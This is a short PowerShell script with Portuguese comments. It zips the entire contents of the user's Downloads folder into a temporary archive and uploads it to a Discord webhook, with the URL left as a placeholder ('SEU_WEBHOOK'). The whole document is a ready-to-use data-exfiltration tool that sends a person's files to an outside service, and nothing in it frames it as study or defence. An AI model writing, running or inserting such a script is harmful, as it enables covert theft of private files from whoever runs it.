# Caminho da pasta de downloads
$downloadDir = [System.Environment]::GetFolderPath('UserProfile') + "\Downloads"
$zipPath = "$env:TEMP\downloads.zip"

# Cria um arquivo zip contendo os arquivos da pasta de downloads
Compress-Archive -Path "$downloadDir\*" -DestinationPath $zipPath -Force

# URL do webhook do Discord
$webhookUrl = "https://discord.com/api/webhooks/SEU_WEBHOOK"

# Envia o arquivo zip para o webhook do Discord
Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $zipPath -ContentType "multipart/form-data"
